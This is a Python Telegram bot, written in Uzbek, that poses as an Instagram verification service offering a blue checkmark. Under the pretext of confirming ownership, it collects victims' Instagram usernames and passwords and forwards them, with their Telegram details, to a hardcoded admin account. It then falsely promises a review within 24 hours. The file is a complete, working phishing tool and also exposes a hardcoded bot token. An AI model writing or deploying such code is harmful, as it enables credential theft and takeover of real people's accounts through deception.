import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# Logging sozlamalari
logging.basicConfig(level=logging.INFO)

# Bot tokeni (siz bergan token)
BOT_TOKEN = "8682057720:AAHMlwuUG05AhWQjatJGm0GoKp2Vy2oHQzU"

# Admin ID (siz bergan ID)
ADMIN_ID = 7447606350

# Bot va dispatcher yaratish
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# Holatlar (States)
class VerificationStates(StatesGroup):
    waiting_for_confirmation = State()
    waiting_for_username = State()
    waiting_for_password = State()


# Start komandasi - YANGI VARIANT
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    
    welcome_text = (
        "✨ Instagram Verifikatsiya Markazi! ✨\n\n"

        "Instagram profilingizga rasmiy {  галочка  } olishning eng oson va ishonchli usuli.\n\n"
        "► Tezkor ariza topshirish\n"
        "► 24 soat ichida natija\n"
        "► Maxfiylik kafolati\n\n"
        "Boshlash uchun istalgan xabar yuboring."
	
    )
    
    await message.answer(welcome_text, parse_mode="HTML")
    await state.set_state(VerificationStates.waiting_for_confirmation)


# Tasdiqlash bosqichi
@dp.message(StateFilter(VerificationStates.waiting_for_confirmation))
async def ask_confirmation(message: types.Message, state: FSMContext):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Ha", callback_data="confirm_yes"),
            InlineKeyboardButton(text="❌ Yo'q", callback_data="confirm_no")
        ]
    ])
    
    await message.answer(
        "📋 <b>Verifikatsiya jarayonini boshlashni tasdiqlaysizmi?</b>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )


# "Ha" tugmasi
@dp.callback_query(lambda c: c.data == "confirm_yes")
async def process_confirm_yes(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.edit_reply_markup(reply_markup=None)
    
    await callback_query.message.answer(
        "🔹 <b>Verifikatsiya qilinishi kerak bo'lgan profilingiz foydalanuvchi nomini (username) kiriting:</b>\n\n"
        "Misol: <code>instagram_user</code>",
        parse_mode="HTML"
    )
    
    await state.set_state(VerificationStates.waiting_for_username)


# "Yo'q" tugmasi
@dp.callback_query(lambda c: c.data == "confirm_no")
async def process_confirm_no(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.edit_reply_markup(reply_markup=None)
    
    await callback_query.message.answer(
        "❌ <b>Siz tasdiqlashni rad etdingiz. Arizangiz bekor qilindi.</b>\n\n"
        "Yana ariza topshirish uchun /start buyrug'ini bosing.",
        parse_mode="HTML"
    )
    
    await state.clear()


# Username qabul qilish
@dp.message(StateFilter(VerificationStates.waiting_for_username))
async def process_username(message: types.Message, state: FSMContext):
    username = message.text.strip()
    
    # Username ni saqlash
    await state.update_data(username=username)
    
    # Konsolga chiqarish
    print(f"\n📝 Username qabul qilindi: @{username} | Foydalanuvchi: {message.from_user.full_name} | ID: {message.from_user.id}")
    
    # Admin ga xabar yuborish
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📥 <b>Yangi ariza:</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
            f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
            f"📝 <b>Instagram username:</b> @{username}\n"
            f"📊 <b>Holat:</b> Parol kutilmoqda...",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"⚠️ Admin xabar yuborilmadi: {e}")
    
    await message.answer(
        "🔒 <b>Hisob egasi ekanligingizni tasdiqlash uchun parolni kiriting:</b>\n\n"
        "<i>Ma'lumotlaringiz xavfsiz saqlanadi.</i>",
        parse_mode="HTML"
    )
    
    await state.set_state(VerificationStates.waiting_for_password)


# Parol qabul qilish
@dp.message(StateFilter(VerificationStates.waiting_for_password))
async def process_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    user_data = await state.get_data()
    username = user_data.get('username', 'Noma\'lum')
    
    # Ma'lumotlarni konsolga chiqarish
    print(f"\n{'='*60}")
    print(f"✅ YANGI MA'LUMOTLAR QABUL QILINDI!")
    print(f"{'='*60}")
    print(f"👤 Foydalanuvchi: {message.from_user.full_name}")
    print(f"🆔 Telegram ID: {message.from_user.id}")
    print(f"📧 Instagram: @{username}")
    print(f"🔐 Parol: {password}")
    print(f"📅 Sana: {message.date}")
    print(f"{'='*60}\n")
    
    # Admin ga to'liq ma'lumot
    try:
        admin_text = (
            f"✅ <b>YANGI MA'LUMOT!</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
            f"🆔 <b>Telegram ID:</b> <code>{message.from_user.id}</code>\n"
            f"📧 <b>Instagram:</b> @{username}\n"
            f"🔐 <b>Parol:</b> <code>{password}</code>\n"
            f"📅 <b>Sana:</b> {message.date.strftime('%d.%m.%Y %H:%M')}"
        )
        
        # Agar foydalanuvchi Telegram username ga ega bo'lsa
        if message.from_user.username:
            admin_text += f"\n🔗 <b>Telegram:</b> @{message.from_user.username}"
            
        await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML")
        
    except Exception as e:
        print(f"⚠️ Admin xabar yuborilmadi: {e}")
    
    # Foydalanuvchiga yakuniy xabar
    final_message = (
        "✅ <b>ARIZANGIZ MUVOFFAQIYATLI QABUL QILINDI!</b>\n\n"
        "📋 Ma'lumotlaringiz tekshirish uchun yuborildi.\n\n"
        "⏳ <b>Arizangiz 24 soat ichida mutaxassislar tomonidan ko'rib chiqiladi.</b>\n\n"
        "📞 Natija haqida sizga telegram orqali xabar beramiz.\n\n"
        
    )
    
    await message.answer(final_message, parse_mode="HTML")
    
    # Holatni tozalash
    await state.clear()


# Boshqa xabarlar
@dp.message()
async def handle_other_messages(message: types.Message):
    await message.answer(
        "ℹ️ Botdan foydalanish uchun /start buyrug'ini bosing.",
        parse_mode="HTML"
    )


# Botni ishga tushirish
async def main():
    print("\n" + "="*60)
    print("🤖 Instagram Verify Bot ishga tushdi!")
    print("="*60)
    print(f"📊 Bot token: 8682057720:AAHMlwuUG05AhWQjatJGm0GoKp2Vy2oHQzU")
    print(f"👤 Admin ID: 7447606350")
    print("="*60)
    print("✅ Bot muvaffaqiyatli ishga tushdi!")
    print("📝 Ma'lumotlar konsolga chiqariladi va admin ga yuboriladi")
    print("="*60 + "\n")
    
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
